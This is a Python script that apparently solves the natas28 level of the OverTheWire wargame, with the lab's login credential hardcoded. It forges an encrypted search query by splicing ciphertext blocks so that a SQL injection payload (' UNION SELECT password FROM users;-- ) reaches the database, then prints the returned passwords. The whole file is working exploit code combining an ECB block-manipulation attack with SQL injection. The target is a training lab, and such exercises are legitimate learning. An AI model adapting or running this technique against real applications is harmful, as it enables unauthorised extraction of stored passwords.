import requests
import base64
from urllib.parse import unquote, quote

URL = "http://natas28.natas.labs.overthewire.org/index.php"
AUTH = ('natas28', '1JNwQM1Oi6J6j1k49Xyw7ZN6pXMQInVj')

def get_raw_ciphertext(payload):
    session = requests.Session()
    session.auth = AUTH
    res = session.post(URL, data={'query': payload}, allow_redirects=False)
    encrypted_b64 = res.headers['Location'].split('query=')[1]
    return base64.b64decode(unquote(encrypted_b64))

def run_exploit():
    wrapper_raw = get_raw_ciphertext("A" * 9)
    header = wrapper_raw[:48]
    footer = wrapper_raw[64:]
    sql_payload = " " * 9 + "' UNION SELECT password FROM users;-- "
    sql_raw = get_raw_ciphertext(sql_payload)
    malicious_part = sql_raw[48:96] 
    final_ciphertext = header + malicious_part + footer
    final_b64 = quote(base64.b64encode(final_ciphertext).decode())
    exploit_url = f"http://natas28.natas.labs.overthewire.org/search.php?query={final_b64}"
    
    print(f"--- Exploit URL ---")
    print(exploit_url)
    response = requests.get(exploit_url, auth=AUTH)
    print(response.text)

if __name__ == "__main__":
    run_exploit()